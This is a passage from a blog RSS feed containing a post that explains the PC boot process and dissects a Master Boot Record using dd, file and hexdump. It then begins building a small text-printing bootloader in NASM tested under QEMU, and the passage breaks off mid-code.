<li id="fn:2">
<p><a href="https://www.man7.org/linux/man-pages/man5/auditd.conf.5.html">https://www.man7.org/linux/man-pages/man5/auditd.conf.5.html</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-system_auditing">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-system_auditing</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Fun with Master Boot Record</title>
      <link>https://ayedaemon.github.io/post/2022/09/fun-with-mbr/</link>
      <pubDate>Wed, 28 Sep 2022 01:10:18 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/09/fun-with-mbr/</guid>
      <description>Analysis of bootloader and partition table; And some fun with Master Boot Record</description>
      <content:encoded><![CDATA[<p>Malware has been used numerous times by attackers to destroy a computer&rsquo;s Master Boot Record, rendering it inoperable. By erasing the MBR, the machine is unable to load the operating system. There is no easy way to rewrite the Master Boot Record into place without an operating system, and the machine becomes completely useless and unrecoverable. In addition, many ransomwares infect the master boot record by overwriting it with malicious code. The system is then automatically restarted to allow the infection to take place. When the system restarts, the user is locked out, and the ransomware displays a note demanding payment. Simple money!</p>
<p>To understand how all of this is possible, and how an attacker can achieve it, we must first understand the MBR and the process of its execution.</p>
<h2 id="the-boot-process">The boot process</h2>
<p>The booting procedure of a system has become simpler over time, but this does not always imply that it is any easier. Every computer, big or small, goes through a start-up procedure known as the &ldquo;Boot&rdquo; process. Because different types of hardware operate in different ways, the boot procedure is heavily influenced by the type of CPU architecture and other hardware components.</p>
<p>To avoid confusion, I won&rsquo;t go into great detail about each stage of the booting process. However, a typical linux booting procedure involves the following phases at a higher level:</p>
<ol>
<li>
<p><strong>Power Up</strong></p>
<p>This is the step where you press the power button. This triggers the <a href="https://en.wikipedia.org/wiki/BIOS">BIOS</a> <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> from motherboard&rsquo;s flash memory to start executing it&rsquo;s functions.</p>
</li>
<li>
<p><strong>Power On Self Test</strong></p>
<p>After BIOS is up and running, it initiates a quick self test to know if all the required hardware components are in working condition.</p>
</li>
<li>
<p><strong>Find a boot device</strong></p>
<p>This step finds all the bootable devices from the earlier detected hard drives. The way this works is by checking the MBR (Master Boot Record) for each detected devices. MBR is refered to the first 512 bytes of any bootable device.</p>
</li>
<li>
<p><strong>Load the MBR</strong></p>
<p>MBR is the first 512 bytes. These 512 bytes contains a bootloader, partition table and the magic number. This is loaded into ram and is responsible to read data from drives and start the operating system.</p>
</li>
<li>
<p><strong>Load GRUB</strong></p>
<p>This is a boot loader program which works in 2 stages. First stage is a small machine code binary on MBR. Its sole job is to locate the second stage boot loader and load it in memory. Once the second stage boot loader is in the memory, it presents the user with a graphical screen showing the different operating systems to choose from.</p>
</li>
<li>
<p><strong>Kernel</strong></p>
<p>The above OS selection decides what kernel and optional initramfs is to be loaded into memory. The kernel then initializes and configures the computer&rsquo;s memory and configures the various hardware attached to the system, including all the I/O subsystems. After some more operations, the kernel is completely loaded into memory and is operational. It&rsquo;s time to set up the user environment.</p>
</li>
<li>
<p><strong>init</strong></p>
<p>This is the first userspace program that is started by kernel. Now this starts and manages all the userspace processes like your web browser, file manager, web servers, etc.</p>
</li>
</ol>
<h2 id="mbr-and-other-little-things">MBR and other little things</h2>
<p>Now that we are aware of how the boot procedure works, we can go on to the article&rsquo;s main objective, the <a href="https://en.wikipedia.org/wiki/Master_boot_record">Master Boot Record</a>. (but not this <a href="https://www.youtube.com/c/MasterBootRecord">Master Boot Record</a>)</p>
<p>If you&rsquo;re not already aware, this is how a typical hard drive appears from the outside.</p>
<p><img loading="lazy" src="https://external-preview.redd.it/MNhQwTRxl_vXaEKZikrhbSz0A_vSK0zMzRFH5g7ZvOM.jpg?auto=webp&amp;s=7ac34d2a3701d51967d02fab59eea9bb2db7f1da#center" alt="source: reddit"  />
</p>
<p>There are numerous components inside this small semi-metallic box that aid in its proper operation.</p>
<p><img loading="lazy" src="https://www.researchgate.net/profile/Mostafa-Sabbaghi/publication/317472565/figure/fig2/AS:613957429645317@1523390266281/Intact-HDD-with-the-cover-removed-left-and-exploded-image-of-a-HDD-showing-individual.png#center" alt="source: researchgate.net"  />
</p>
<p>But we don&rsquo;t need to know about all of these components; instead, we&rsquo;ll concentrate on the disc-like structure in the centre. This is known as a <strong>platter</strong>. A platter is a single recording disc. A hard disc drive may have one or more platters.</p>
<p><img loading="lazy" src="https://safemode.com.au/wp-content/uploads/2020/01/hard-drive-parts-min.png#center" alt="source: safemode.com"  />
</p>
<p>Each platter is divided into several circular tracks, and each track is further divided into several sectors. Each sector on a hard disc drive typically stores 512 bytes of user-accessible data.</p>
<p><img loading="lazy" src="https://qph.fs.quoracdn.net/main-qimg-0763e88136c511a9f93c49ce3e84360f#center" alt="source: quora"  />
</p>
<p>The first 512 bytes (or first sector) of a hard drive is where the MBR is located. And since everything in Linux is a &ldquo;file&rdquo;, if we want to extract MBR data, all we have to do is to read the first 512 bytes of our bootable hard disk file and then write that content to another local file for further analysis. In most of the linux platforms, we can do this by <a href="https://www.man7.org/linux/man-pages/man1/dd.1.html"><code>dd</code></a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dd if=/dev/sda of=mbr.sample bs=512 count=1
</span></span></code></pre></div><p>The above command will read a 512-byte block (once) from <code>/dev/sda</code> and save it in the <code>mbr.sample</code> file. Then we can the check the type of this file using <code>file</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file mbr.sample
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Output</span>
</span></span><span class="line"><span class="cl"><span class="c1"># mbr.sample: x86 boot sector; partition 1: ID=0x83, active, starthead 32, startsector 2048, 2097152 sectors; partition 2: ID=0x8e, starthead 170, startsector 2099200, 41191424 sectors, code offset 0x63</span>
</span></span></code></pre></div><p>An x86 boot sector is recognised in this file. Interestingly, it also lists the start head, start sector, total number of sectors, offset, and IDs of all the partitions. This was sufficient reason for me to dig up the file&rsquo;s hexdump and understand how <code>file</code> command is able to gather all this information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hexdump -C mbr.sample
</span></span></code></pre></div><p>Output:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">00000000  eb 63 90 10 8e d0 bc 00  b0 b8 00 00 8e d8 8e c0  |.c..............|
</span></span><span class="line"><span class="cl">00000010  fb be 00 7c bf 00 06 b9  00 02 f3 a4 ea 21 06 00  |...|.........!..|
</span></span><span class="line"><span class="cl">00000020  00 be be 07 38 04 75 0b  83 c6 10 81 fe fe 07 75  |....8.u........u|
</span></span><span class="line"><span class="cl">00000030  f3 eb 16 b4 02 b0 01 bb  00 7c b2 80 8a 74 01 8b  |.........|...t..|
</span></span><span class="line"><span class="cl">00000040  4c 02 cd 13 ea 00 7c 00  00 eb fe 00 00 00 00 00  |L.....|.........|
</span></span><span class="line"><span class="cl">00000050  00 00 00 00 00 00 00 00  00 00 00 80 01 00 00 00  |................|
</span></span><span class="line"><span class="cl">00000060  00 00 00 00 ff fa 90 90  f6 c2 80 74 05 f6 c2 70  |...........t...p|
</span></span><span class="line"><span class="cl">00000070  74 02 b2 80 ea 79 7c 00  00 31 c0 8e d8 8e d0 bc  |t....y|..1......|
</span></span><span class="line"><span class="cl">00000080  00 20 fb a0 64 7c 3c ff  74 02 88 c2 52 be 05 7c  |. ..d|&lt;.t...R..||
</span></span><span class="line"><span class="cl">00000090  b4 41 bb aa 55 cd 13 5a  52 72 3d 81 fb 55 aa 75  |.A..U..ZRr=..U.u|
</span></span><span class="line"><span class="cl">000000a0  37 83 e1 01 74 32 31 c0  89 44 04 40 88 44 ff 89  |7...t21..D.@.D..|
</span></span><span class="line"><span class="cl">000000b0  44 02 c7 04 10 00 66 8b  1e 5c 7c 66 89 5c 08 66  |D.....f..\|f.\.f|
</span></span><span class="line"><span class="cl">000000c0  8b 1e 60 7c 66 89 5c 0c  c7 44 06 00 70 b4 42 cd  |..`|f.\..D..p.B.|
</span></span><span class="line"><span class="cl">000000d0  13 72 05 bb 00 70 eb 76  b4 08 cd 13 73 0d 5a 84  |.r...p.v....s.Z.|
</span></span><span class="line"><span class="cl">000000e0  d2 0f 83 de 00 be 85 7d  e9 82 00 66 0f b6 c6 88  |.......}...f....|
</span></span><span class="line"><span class="cl">000000f0  64 ff 40 66 89 44 04 0f  b6 d1 c1 e2 02 88 e8 88  |d.@f.D..........|
</span></span><span class="line"><span class="cl">00000100  f4 40 89 44 08 0f b6 c2  c0 e8 02 66 89 04 66 a1  |.@.D.......f..f.|
</span></span><span class="line"><span class="cl">00000110  60 7c 66 09 c0 75 4e 66  a1 5c 7c 66 31 d2 66 f7  |`|f..uNf.\|f1.f.|
</span></span><span class="line"><span class="cl">00000120  34 88 d1 31 d2 66 f7 74  04 3b 44 08 7d 37 fe c1  |4..1.f.t.;D.}7..|
</span></span><span class="line"><span class="cl">00000130  88 c5 30 c0 c1 e8 02 08  c1 88 d0 5a 88 c6 bb 00  |..0........Z....|
</span></span><span class="line"><span class="cl">00000140  70 8e c3 31 db b8 01 02  cd 13 72 1e 8c c3 60 1e  |p..1......r...`.|
</span></span><span class="line"><span class="cl">00000150  b9 00 01 8e db 31 f6 bf  00 80 8e c6 fc f3 a5 1f  |.....1..........|
</span></span><span class="line"><span class="cl">00000160  61 ff 26 5a 7c be 80 7d  eb 03 be 8f 7d e8 34 00  |a.&amp;Z|..}....}.4.|
</span></span><span class="line"><span class="cl">00000170  be 94 7d e8 2e 00 cd 18  eb fe 47 52 55 42 20 00  |..}.......GRUB .|
</span></span><span class="line"><span class="cl">00000180  47 65 6f 6d 00 48 61 72  64 20 44 69 73 6b 00 52  |Geom.Hard Disk.R|
</span></span><span class="line"><span class="cl">00000190  65 61 64 00 20 45 72 72  6f 72 0d 0a 00 bb 01 00  |ead. Error......|
</span></span><span class="line"><span class="cl">000001a0  b4 0e cd 10 ac 3c 00 75  f4 c3 00 00 00 00 00 00  |.....&lt;.u........|
</span></span><span class="line"><span class="cl">000001b0  00 00 00 00 00 00 00 00  70 7e 04 00 00 00 80 20  |........p~..... |
</span></span><span class="line"><span class="cl">000001c0  21 00 83 aa 28 82 00 08  00 00 00 00 20 00 00 aa  |!...(....... ...|
</span></span><span class="line"><span class="cl">000001d0  29 82 8e fe ff ff 00 08  20 00 00 88 74 02 00 00  |)....... ...t...|
</span></span><span class="line"><span class="cl">000001e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span class="line"><span class="cl">000001f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 55 aa  |..............U.|
</span></span><span class="line"><span class="cl">00000200
</span></span></code></pre></div><p><img loading="lazy" src="https://media.giphy.com/media/3o6MbbwX2g2GA4MUus/giphy.gif#center" alt=""  />
</p>
<h3 id="dissecting-the-master-boot-record">Dissecting the Master Boot Record</h3>
<p>Without any knowledge of layout, simply looking at the <code>hexdump</code> output is not particularly helpful. Therefore, it is now necessary to understand the MBR layout.</p>
<p>MBR consists of 3 parts - <strong>bootloader</strong>, <strong>partition table</strong>, and <strong>magic number</strong>.</p>
<p>The magic number is found in the final two bytes, as opposed to the regular userspace files. It is <code>55AA</code> in the file, but be mindful of the processor&rsquo;s endianness. Since my CPU is little endian, the leftmost bytes are read first. As a result, <code>AA55</code> will become the magic number.</p>
<p>After that is subtracted, we are left with <code>512-2 = 510</code> bytes. Out of these, the bootloader is stored in the first <code>446</code> bytes, and the partition tables are stored in the remaining <code>64</code> bytes. To evaluate these components separately, let&rsquo;s extract them into distinct files using the same old <code>dd</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Bootlaoder</span>
</span></span><span class="line"><span class="cl">dd <span class="k">if</span><span class="o">=</span>mbr.sample <span class="nv">of</span><span class="o">=</span>mbr.bootloader <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">count</span><span class="o">=</span><span class="m">446</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Partition table (skip first 446 bytes)</span>
</span></span><span class="line"><span class="cl">dd <span class="k">if</span><span class="o">=</span>mbr.sample <span class="nv">of</span><span class="o">=</span>mbr.partition_table <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">count</span><span class="o">=</span><span class="m">64</span> <span class="nv">skip</span><span class="o">=</span><span class="m">446</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## magic (skip first 510 bytes)</span>
</span></span><span class="line"><span class="cl">dd <span class="k">if</span><span class="o">=</span>mbr.sample <span class="nv">of</span><span class="o">=</span>mbr.magic <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">count</span><span class="o">=</span><span class="m">2</span> <span class="nv">skip</span><span class="o">=</span><span class="m">510</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Check file types</span>
</span></span><span class="line"><span class="cl">file *
</span></span><span class="line"><span class="cl"><span class="c1">## Output</span>
</span></span><span class="line"><span class="cl"><span class="c1"># mbr.bootloader:      data</span>
</span></span><span class="line"><span class="cl"><span class="c1"># mbr.magic:           BIOS (ia32) ROM Ext.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># mbr.partition_table: 8086 relocatable (Microsoft)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># mbr.sample:          x86 boot sector; partition 1: ID=0x83, active, starthead 32, startsector 2048, 2097152 sectors; partition 2: ID=0x8e, starthead 170, startsector 2099200, 41191424 sectors, code offset 0x63</span>
</span></span></code></pre></div><p>It&rsquo;s fantastic that the file command can recognise each of these MBR components separately. Now with separate files, we can carefully examine the partition table and determine what data it can give us.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hexdump -C -v  mbr.partition_table
</span></span></code></pre></div><p>Output:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">00000000  80 20 21 00 83 aa 28 82  00 08 00 00 00 00 20 00  |. !...(....... .|
</span></span><span class="line"><span class="cl">00000010  00 aa 29 82 8e fe ff ff  00 08 20 00 00 88 74 02  |..)....... ...t.|
</span></span><span class="line"><span class="cl">00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span class="line"><span class="cl">00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span></code></pre></div><p>The MBR system only supports 4 primary partitions since partition tables actually only contain 4 records. We must divide a primary partition into smaller partitions and keep a separate partition table inside of that primary partition if we want to construct more than four partitions. The term &ldquo;Expanded partitions&rdquo; is in fact used to describe these extended partitions. We can see from the result above that there are a total of 64 bytes, giving us a total of <code>64/4 = 16</code> bytes for each record. Let&rsquo;s understand the layout of these 16 bytes and then we can analyze the partition table data using <code>hexdump</code>.</p>
<table>
<thead>
<tr>
<th>Size (in bytes)</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Boot indicator (0x80 for active and 0x00 for inactive)</td>
</tr>
<tr>
<td>1</td>
<td>partition start: head</td>
</tr>
<tr>
<td>1</td>
<td>partition start: sector</td>
</tr>
<tr>
<td>1</td>
<td>partition start: cylinder</td>
</tr>
<tr>
<td>1</td>
<td>Partition ID</td>
</tr>
<tr>
<td>1</td>
<td>partition end: head</td>
</tr>
<tr>
<td>1</td>
<td>partition end: sector</td>
</tr>
<tr>
<td>1</td>
<td>partition end: cylinder</td>
</tr>
<tr>
<td>4</td>
<td>Number of sectors before the beginning of this partition (sectors_before)</td>
</tr>
<tr>
<td>4</td>
<td>Number of sectors in this partition (number_of_sectors)</td>
</tr>
</tbody>
</table>
<p>There are 16 bytes in all of that. Now we know where the information that the <code>file</code> command was displaying previously comes from.</p>
<p>Based on the information we have now, we can figure out few things on our own&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">00000000  80 20 21 00 83 aa 28 82  00 08 00 00 00 00 20 00  |. !...(....... .|
</span></span><span class="line"><span class="cl">00000010  00 aa 29 82 8e fe ff ff  00 08 20 00 00 88 74 02  |..)....... ...t.|
</span></span><span class="line"><span class="cl">00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span class="line"><span class="cl">00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span></code></pre></div><p>For example, this disk only has 2 partitions because the final 2 records are all zeros. Due to the &lsquo;0x80&rsquo; byte in the first records, the first partition is bootable. And the ID for that partition is <code>83</code>. While the second partition is non bootable partition, and the ID of that partition is <code>82</code>. If you want, you can even calculate the size of each partition with the help of other information present in these records.</p>
<p>We are now down to the first <code>446</code> bytes, which include the bootloader.
The bootloader is simply a software that reads and loads other applications from the bootable partition.GRUB typically loads the second stage of itself from disk, however this is not a condition.There are bootloaders that load the kernel directly into memory or, even better, some of them are <a href="https://forum.osdev.org/viewtopic.php?f=2&amp;t=18763">full-fledged application that just works</a>. <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></p>
<p><em>Note:- Although I won&rsquo;t be discussing it today, you can use the <code>ndisasm</code> disassembler to disassemble the bootloader image.This will require for some knowledge of the interrupts and memory management in the BIOS, which is outside the scope of this blog.</em></p>
<p>That settles it; now that we are aware of what is contained within an MBR, why don&rsquo;t we attempt to construct one?</p>
<p><img loading="lazy" src="https://media.giphy.com/media/R459x856IfF6w/giphy.gif#center" alt=""  />
</p>
<h2 id="creating-your-own-bootloader">Creating your own bootloader</h2>
<p>To start, we&rsquo;ll make a simple raw binary file and put <code>AA55</code> in it. Keep in mind that this is the <strong>magic number</strong> that belongs in an MBR.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">dw</span> <span class="mi">0xAA55</span>
</span></span></code></pre></div><p>Save this file as <code>custom bootloader.asm</code>. After compiling it with the <code>nasm</code> compiler, the results should look like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Compile custom_bootloader.asm</span>
</span></span><span class="line"><span class="cl">nasm -fbin custom_bootloader.asm -o custom_bootloader.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Check the file type</span>
</span></span><span class="line"><span class="cl">file rhel_magic_number custom_bootloader.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Output</span>
</span></span><span class="line"><span class="cl"><span class="c1"># rhel_magic_number:     ISO-8859 text, with no line terminators</span>
</span></span><span class="line"><span class="cl"><span class="c1"># custom_bootloader.bin: ISO-8859 text, with no line terminators</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Check hexdump</span>
</span></span><span class="line"><span class="cl">hexdump -C custom_bootloader.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Ouput</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 00000000  55 aa                                             |U.|</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 00000002</span>
</span></span></code></pre></div><p>We now have a 2 byte file containing the magic number. However, because the MBR is 512 bytes long, we must fill 510 more bytes. For the time being, let&rsquo;s just fill it with zeros and see if it&rsquo;s a valid MBR file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">times</span> <span class="mi">510</span> <span class="no">db</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="nf">dw</span> <span class="mi">0xAA55</span>
</span></span></code></pre></div><p>The above code will write <code>0</code> 510 times and then write <code>AA55</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Compile custom_bootloader.asm</span>
</span></span><span class="line"><span class="cl">nasm -fbin custom_bootloader.asm -o custom_bootloader.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Check the file type</span>
</span></span><span class="line"><span class="cl">file rhel_mbr custom_bootloader.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Ouput</span>
</span></span><span class="line"><span class="cl"><span class="c1"># rhel_mbr:              DOS/MBR boot sector</span>
</span></span><span class="line"><span class="cl"><span class="c1"># custom_bootloader.bin: DOS/MBR boot sector</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Check hexdump</span>
</span></span><span class="line"><span class="cl">hexdump -C custom_bootloader.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Ouput</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span>
</span></span><span class="line"><span class="cl"><span class="c1"># *</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 000001f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 55 aa  |..............U.|</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 00000200</span>
</span></span></code></pre></div><p>This is, as expected, a valid MBR file with no information about the partition table or the bootloader. Can we, however, use this to boot the system?</p>
<p>Let&rsquo;s make an attempt.</p>
<p>I first tried without any mbr data to see what errors I would get when it fails.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">qemu-system-x86_64
</span></span></code></pre></div><p>And, as I was expecting, it said &ldquo;no bootable device.&rdquo;</p>
<p><img loading="lazy" src="https://i.imgur.com/wMCYSoo.png#center" alt=""  />
</p>
<p>Let&rsquo;s run the test again, but this time with the MBR file we made.</p>
<p><img loading="lazy" src="https://i.imgur.com/DJS9nN2.png#center" alt=""  />
</p>
<p>It did not give me the error this time. That must imply that our MBR is functional. Since it lacks bootloader code, it does nothing. However, it is not returning the same previous error.</p>
<p>We can now add new instructions to our assembly file. However, we must keep in mind that we do not exceed the file&rsquo;s 512-byte limit. That means we&rsquo;ll have to take care of the zeros we&rsquo;re padding with. Because this is a very simple problem, there are special characters that can assist us in calculating the memory address of the beginning of the file and the current address in the file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">times</span> <span class="mi">510</span><span class="p">-(</span><span class="no">$-$$</span><span class="p">)</span> <span class="no">db</span> <span class="mi">0</span>       <span class="c1">;$ - Start addr; $$ - current addr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">dw</span> <span class="mi">0xAA55</span>
</span></span></code></pre></div><p>We can calculate the exact number of zeros required for padding using these special characters. Let&rsquo;s compile it and put it to the test.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">nasm</span> <span class="o">-</span><span class="n">fbin</span> <span class="n">custom_bootloader</span><span class="o">.</span><span class="n">asm</span> <span class="o">-</span><span class="n">o</span> <span class="n">custom_bootloader</span><span class="o">.</span><span class="n">bin</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">qemu</span><span class="o">-</span><span class="n">system</span><span class="o">-</span><span class="n">x86_64</span> <span class="n">custom_bootloader</span><span class="o">.</span><span class="n">bin</span>
</span></span></code></pre></div><p>This produces the same results as before, and the output file size remains 512 bytes. Let&rsquo;s add some more instructions to help us write some text on the screen.</p>
<p>Unlike userspace and kernelspace programs, we do not have any helper functions that can take a string and automatically print it to the screen. We&rsquo;ll have to tell the BIOS to do what we want here. And the only way I&rsquo;m aware of is through <strong>interrupts</strong>. It is the same facility that operating systems and application programmes use to access BIOS functions.</p>
<p><a href="https://en.wikipedia.org/wiki/BIOS_interrupt_call#Interrupt_table">Here</a> is a list of common BIOS interrupts. Not all BIOS (especially older ones) support all of these interrupts. The basic idea of using interrupts is we place proper values in some specific registers, and then trigger the interrupt. The interrupt routine will then fetch the values from those registers and based on that, it&rsquo;ll perform some action.</p>
<p>Anyway, using the above table, I determined that we needed to use interrupt vector <code>10h</code> (or 0x10) with interrupt vector <code>03h</code> (or 0x03) in <code>AH</code> register. Consider it as invoking the 10h function with the parameter value 03h. This returns the cursor&rsquo;s current position and shape.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mov ah, 0x03;
</span></span><span class="line"><span class="cl">int 10h
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">times 510-($-$$) db 0
</span></span><span class="line"><span class="cl">dw 0xAA55
</span></span></code></pre></div><p>We can see that some initial bytes are written to the binary file after compiling and inspecting the hexdump&hellip;. And, thanks to <code>$</code> and <code>$$</code>, the file size remains 512 bytes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Compiling the binary</span>
</span></span><span class="line"><span class="cl">nasm -fbin custom_bootloader.asm -o custom_bootloader.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Checking hexdump</span>
</span></span><span class="line"><span class="cl">hexdump -C custom_bootloader.bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Output</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 00000000  b8 03 00 cd 10 00 00 00  00 00 00 00 00 00 00 00  |................|</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span>
</span></span><span class="line"><span class="cl"><span class="c1"># *</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 000001f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 55 aa  |..............U.|</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 00000200</span>
</span></span></code></pre></div><p>This switches the BIOS to TTY mode, allowing me to print characters using the same interrupt <code>10h</code> but with a different value in the <code>ah</code> register.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mov ah, 0x03
</span></span><span class="line"><span class="cl">int 10h
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mov ah, 0xE
</span></span><span class="line"><span class="cl">mov al, &#39;H&#39;
</span></span><span class="line"><span class="cl">int 0x10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mov al, &#39;E&#39;
</span></span><span class="line"><span class="cl">int 0x10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mov al, &#39;Y&#39;
</span></span><span class="line"><span class="cl">int 0x10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">times 510-($-$$) db 0
</span></span><span class="line"><span class="cl">dw 0xAA55
</span></span></code></pre></div><p>When we compile and run this with qemu, we get the message &ldquo;HEY&rdquo; printed on the screen.</p>
<p><img loading="lazy" src="https://i.imgur.com/9YAcZ03.png#center" alt=""  />
</p>
<p>Now that we know how to write characters on the screen, let&rsquo;s make a string and loop through it until the end, printing each character on the screen one by one using the same interrupt combination.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">;</span> <span class="n">Setup</span> <span class="n">TTY</span> <span class="n">mode</span>
</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x03</span>
</span></span><span class="line"><span class="cl"><span class="ne">int</span> <span class="mi">10</span><span class="n">h</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">si</span><span class="p">,</span> <span class="n">msg</span>      <span class="p">;</span> <span class="n">si</span> <span class="n">register</span> <span class="n">now</span> <span class="n">points</span> <span class="n">to</span> <span class="n">msg</span>
</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">ah</span><span class="p">,</span> <span class="mi">0</span><span class="n">Eh</span>      <span class="p">;</span> <span class="n">Use</span> <span class="n">write</span> <span class="n">function</span> <span class="n">from</span> <span class="mi">10</span><span class="n">h</span> <span class="n">interrupt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">loop</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">lodsb</span>          <span class="p">;</span> <span class="nb">load</span> <span class="n">first</span> <span class="n">char</span> <span class="n">from</span> <span class="n">msg</span> <span class="ow">and</span> <span class="n">point</span> <span class="n">to</span> <span class="n">next</span> <span class="n">char</span>
